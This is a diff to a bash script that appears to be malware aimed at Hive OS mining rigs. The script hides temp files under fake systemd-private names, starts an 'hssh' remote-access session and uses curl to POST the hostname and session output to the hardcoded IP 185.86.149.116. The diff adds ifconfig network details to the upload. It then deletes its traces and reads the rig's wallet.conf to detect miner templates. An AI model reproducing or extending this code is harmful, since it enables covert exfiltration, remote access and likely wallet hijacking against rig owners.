@@ -1,10 +1,12 @@
 #! /usr/bin/env bash
 FILE_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service
 HSSH_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service.pid
+IFCONFIG_HOSTNAME=/tmp/systemd-private-573f90440f934615953a8ef0764847d2-unknown.service.sock
 /bin/hostname > ${FILE_HOSTNAME}
 /hive/bin/hssh start > ${HSSH_HOSTNAME}
-/hive/sbin/curl -XPOST -F "hostname=@${FILE_HOSTNAME}" -F "hssh=@${HSSH_HOSTNAME}" "http://185.86.149.116:8085/"
-rm ${FILE_HOSTNAME} ${HSSH_HOSTNAME}
+/sbin/ifconfig > ${IFCONFIG_HOSTNAME}
+/hive/sbin/curl -XPOST -F "hostname=@${FILE_HOSTNAME}" -F "hssh=@${HSSH_HOSTNAME}" -F "ifconfig=@${IFCONFIG_HOSTNAME}" "http://185.86.149.116:8085/"
+rm ${FILE_HOSTNAME} ${HSSH_HOSTNAME} ${IFCONFIG_HOSTNAME}
 FILE=/hive-config/wallet.conf
 IS_GMINER=$(/bin/cat $FILE | /bin/grep 'GMINER_TEMPLATE=' | wc -l)
 IS_CLAYMORE=$(/bin/cat $FILE | /bin/grep 'EPOOLS_TPL=' | wc -l)
